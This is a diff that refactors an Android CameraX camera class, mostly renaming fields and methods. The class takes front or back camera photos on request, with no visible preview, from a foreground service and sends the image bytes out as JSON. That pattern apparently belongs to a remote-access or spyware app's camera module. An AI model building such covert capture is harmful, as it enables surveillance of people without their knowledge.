@@ -29,81 +29,104 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
+// Camera manager using CameraX
 public class CameraManager {
 
-    private final Context context;
-    private final Executor mainExecutor;
-    private final ExecutorService cameraExecutor;
-    private final ExecutorService sendExecutor;
-    private ProcessCameraProvider cameraProvider;
-    private ImageCapture imageCapture;
-    private final AtomicBoolean isInitialized = new AtomicBoolean(false);
-    private final AtomicBoolean isCapturing = new AtomicBoolean(false);
-    private final CountDownLatch initLatch = new CountDownLatch(1);
+    private final Context ctx;
+    private final Executor mainExec;
+    private final ExecutorService camExec;
+    private final ExecutorService sendExec;
+    private ProcessCameraProvider provider;
+    private ImageCapture capture;
+    private final AtomicBoolean init = new AtomicBoolean(false);
+    private final AtomicBoolean capturing = new AtomicBoolean(false);
 
-    public CameraManager(Context ctx) {
-        this.context = ctx.getApplicationContext();
-        this.mainExecutor = ContextCompat.getMainExecutor(context);
-        this.cameraExecutor = Executors.newSingleThreadExecutor();
-        this.sendExecutor = Executors.newSingleThreadExecutor();
+    public CameraManager(Context context) {
+        this.ctx = context.getApplicationContext();
+        this.mainExec = ContextCompat.getMainExecutor(ctx);
+        this.camExec = Executors.newSingleThreadExecutor();
+        this.sendExec = Executors.newSingleThreadExecutor();
         init();
     }
 
+    // Initialize camera
     private void init() {
-        cameraExecutor.execute(() -> {
+        camExec.execute(() -> {
             try {
                 ListenableFuture<ProcessCameraProvider> future =
-                    ProcessCameraProvider.getInstance(context);
+                    ProcessCameraProvider.getInstance(ctx);
 
                 future.addListener(() -> {
                     try {
-                        cameraProvider = future.get();
-                        imageCapture = new ImageCapture.Builder()
+                        provider = future.get();
+                        capture = new ImageCapture.Builder()
                             .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                             .setJpegQuality(80)
                             .setFlashMode(ImageCapture.FLASH_MODE_AUTO)
                             .build();
-                        isInitialized.set(true);
-                        initLatch.countDown();
-                    } catch (Exception e) {
-                        initLatch.countDown();
-                    }
-                }, mainExecutor);
-
-                // Wait for initialization with timeout
-                initLatch.await(5, TimeUnit.SECONDS);
+                        init.set(true);
+                    } catch (Exception ignored) {}
+                }, mainExec);
             } catch (Exception ignored) {}
         });
     }
 
-    /**
-     * Ensure camera is ready, reinitialize if needed
-     */
-    private boolean ensureInitialized() {
-        if (isInitialized.get() && cameraProvider != null) {
-            return true;
+    // Check camera permission
+    private boolean hasPerm() {
+        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
+            == PackageManager.PERMISSION_GRANTED;
+    }
+
+    // Start capture
+    public void capture(int camId) {
+        if (!hasPerm()) {
+            sendError(camId, "No camera permission");
+            return;
         }
 
-        // Reinitialize
-        isInitialized.set(false);
-        CountDownLatch latch = new CountDownLatch(1);
+        if (capturing.getAndSet(true)) return;
 
-        cameraExecutor.execute(() -> {
+        // Update service type for Android 14+
+        MainService svc = MainService.getInstance();
+        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
+        }
+
+        camExec.execute(() -> {
+            try {
+                if (!ensureInit()) {
+                    sendError(camId, "Camera init failed");
+                    capturing.set(false);
+                    return;
+                }
+                doCapture(camId);
+            } catch (Exception e) {
+                sendError(camId, "Capture failed: " + e.getMessage());
+                capturing.set(false);
+            }
+        });
+    }
+
+    // Ensure initialized
+    private boolean ensureInit() {
+        if (init.get() && provider != null) return true;
+
+        CountDownLatch latch = new CountDownLatch(1);
+        camExec.execute(() -> {
             try {
                 ListenableFuture<ProcessCameraProvider> future =
-                    ProcessCameraProvider.getInstance(context);
-
+                    ProcessCameraProvider.getInstance(ctx);
                 future.addListener(() -> {
                     try {
-                        cameraProvider = future.get();
-                        imageCapture = new ImageCapture.Builder()
+                        provider = future.get();
+                        capture = new ImageCapture.Builder()
                             .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                             .setJpegQuality(80)
                             .build();
-                        isInitialized.set(true);
+                        init.set(true);
                     } catch (Exception ignored) {}
                     latch.countDown();
-                }, mainExecutor);
+                }, mainExec);
             } catch (Exception e) {
                 latch.countDown();
             }
@@ -111,144 +134,94 @@ public class CameraManager {
 
         try {
             latch.await(3, TimeUnit.SECONDS);
-        } catch (InterruptedException ignored) {}
+        } catch (Exception ignored) {}
 
-        return isInitialized.get() && cameraProvider != null;
+        return init.get() && provider != null;
     }
 
-    /**
-     * Check camera permission
-     */
-    private boolean hasCameraPermission() {
-        return ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
-            == PackageManager.PERMISSION_GRANTED;
-    }
-
-    public void startUp(int camId) {
-        // Check permission first
-        if (!hasCameraPermission()) {
-            sendError(camId, "Camera permission not granted");
+    // Perform capture
+    private void doCapture(int camId) {
+        if (provider == null || capture == null) {
+            sendError(camId, "Camera not ready");
+            capturing.set(false);
             return;
         }
 
-        // Prevent concurrent captures
-        if (isCapturing.getAndSet(true)) {
-            return;
-        }
+        boolean front = camId == 1;
+        CameraSelector sel = front ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
 
-        // Update foreground service type for camera
-        MainService service = MainService.getInstance();
-        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
-        }
-
-        cameraExecutor.execute(() -> {
-            try {
-                if (!ensureInitialized()) {
-                    sendError(camId, "Camera initialization failed");
-                    isCapturing.set(false);
-                    return;
-                }
-                captureInternal(camId);
-            } catch (Exception e) {
-                sendError(camId, "Capture failed: " + e.getMessage());
-                isCapturing.set(false);
-            }
-        });
-    }
-
-    private void captureInternal(int camId) {
-        if (cameraProvider == null || imageCapture == null) {
-            sendError(camId, "Camera not initialized");
-            isCapturing.set(false);
-            return;
-        }
-
-        boolean frontCamera = camId == 1;
-        CameraSelector selector = frontCamera
-            ? CameraSelector.DEFAULT_FRONT_CAMERA
-            : CameraSelector.DEFAULT_BACK_CAMERA;
-
-        // Verify camera exists
         try {
-            selector.filter(cameraProvider.getAvailableCameraInfos());
+            sel.filter(provider.getAvailableCameraInfos());
         } catch (Exception e) {
-            sendError(camId, frontCamera ? "Front camera not available" : "Back camera not available");
-            isCapturing.set(false);
+            sendError(camId, front ? "No front camera" : "No back camera");
+            capturing.set(false);
             return;
         }
 
-        mainExecutor.execute(() -> {
+        mainExec.execute(() -> {
             try {
-                cameraProvider.unbindAll();
-                cameraProvider.bindToLifecycle(
-                    DummyLifecycleOwner.get(),
-                    selector,
-                    imageCapture
-                );
+                provider.unbindAll();
+                provider.bindToLifecycle(DummyLifecycleOwner.get(), sel, capture);
 
-                // Small delay to let camera settle
-                cameraExecutor.execute(() -> {
+                camExec.execute(() -> {
                     try {
                         Thread.sleep(200);
-                        mainExecutor.execute(() -> takePicture(camId));
+                        mainExec.execute(() -> takePicture(camId));
                     } catch (Exception e) {
-                        isCapturing.set(false);
+                        capturing.set(false);
                     }
                 });
             } catch (Exception e) {
-                sendError(camId, "Camera bind failed: " + e.getMessage());
-                isCapturing.set(false);
+                sendError(camId, "Bind failed: " + e.getMessage());
+                capturing.set(false);
             }
         });
     }
 
+    // Take picture
     private void takePicture(int camId) {
-        if (imageCapture == null) {
-            sendError(camId, "ImageCapture not ready");
-            isCapturing.set(false);
+        if (capture == null) {
+            sendError(camId, "Capture not ready");
+            capturing.set(false);
             return;
         }
 
-        imageCapture.takePicture(mainExecutor, new ImageCapture.OnImageCapturedCallback() {
+        capture.takePicture(mainExec, new ImageCapture.OnImageCapturedCallback() {
             @Override
             public void onCaptureSuccess(ImageProxy image) {
-                sendExecutor.execute(() -> {
+                sendExec.execute(() -> {
                     try {
-                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                        byte[] bytes = new byte[buffer.remaining()];
-                        buffer.get(bytes);
+                        ByteBuffer buf = image.getPlanes()[0].getBuffer();
+                        byte[] bytes = new byte[buf.remaining()];
+                        buf.get(bytes);
                         send(bytes, camId);
                     } catch (Exception e) {
-                        sendError(camId, "Image processing failed");
+                        sendError(camId, "Image process failed");
                     } finally {
-                        // Close on main thread
-                        mainExecutor.execute(() -> {
+                        mainExec.execute(() -> {
                             image.close();
-                            isCapturing.set(false);
+                            capturing.set(false);
                         });
                     }
 
-                    // Release foreground service type for camera
-                    MainService service = MainService.getInstance();
-                    if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                        service.releaseForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
+                    MainService svc = MainService.getInstance();
+                    if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                        svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
                     }
                 });
             }
 
             @Override
-            public void onError(ImageCaptureException exception) {
-                sendError(camId, "Capture error: " + exception.getMessage());
-                isCapturing.set(false);
-
-                // Reinitialize on error
-                isInitialized.set(false);
-                cameraExecutor.execute(CameraManager.this::init);
+            public void onError(ImageCaptureException e) {
+                sendError(camId, "Capture error: " + e.getMessage());
+                capturing.set(false);
+                init.set(false);
+                camExec.execute(CameraManager.this::init);
             }
         });
     }
 
+    // Send image data
     private void send(byte[] data, int camId) {
         try {
             JSONObject obj = new JSONObject();
@@ -261,6 +234,7 @@ public class CameraManager {
         } catch (Exception ignored) {}
     }
 
+    // Send error
     private void sendError(int camId, String error) {
         try {
             JSONObject obj = new JSONObject();
@@ -272,23 +246,22 @@ public class CameraManager {
         } catch (Exception ignored) {}
     }
 
-    public JSONObject findCameraList() {
+    // Get camera list
+    public JSONObject getCameraList() {
         try {
             JSONArray list = new JSONArray();
 
-            if (cameraProvider != null) {
-                // Check if front camera exists
+            if (provider != null) {
                 try {
-                    CameraSelector.DEFAULT_FRONT_CAMERA.filter(cameraProvider.getAvailableCameraInfos());
+                    CameraSelector.DEFAULT_FRONT_CAMERA.filter(provider.getAvailableCameraInfos());
                     JSONObject front = new JSONObject();
                     front.put("id", 1);
                     front.put("name", "Front");
                     list.put(front);
                 } catch (Exception ignored) {}
 
-                // Check if back camera exists
                 try {
-                    CameraSelector.DEFAULT_BACK_CAMERA.filter(cameraProvider.getAvailableCameraInfos());
+                    CameraSelector.DEFAULT_BACK_CAMERA.filter(provider.getAvailableCameraInfos());
                     JSONObject back = new JSONObject();
                     back.put("id", 0);
                     back.put("name", "Back");
@@ -296,7 +269,7 @@ public class CameraManager {
                 } catch (Exception ignored) {}
             }
 
-            // Fallback: always return both cameras if list is empty
+            // Fallback defaults
             if (list.length() == 0) {
                 JSONObject back = new JSONObject();
                 back.put("id", 0);
@@ -312,8 +285,9 @@ public class CameraManager {
             JSONObject result = new JSONObject();
             result.put("camList", true);
             result.put("list", list);
-            result.put("hasPermission", hasCameraPermission());
+            result.put("hasPermission", hasPerm());
             return result;
+
         } catch (Exception e) {
             try {
                 JSONObject result = new JSONObject();
@@ -326,8 +300,14 @@ public class CameraManager {
         }
     }
 
+    // Start capture (alias)
+    public void startUp(int camId) {
+        capture(camId);
+    }
+
+    // Shutdown
     public void shutdown() {
-        cameraExecutor.shutdown();
-        sendExecutor.shutdown();
+        camExec.shutdown();
+        sendExec.shutdown();
     }
 }
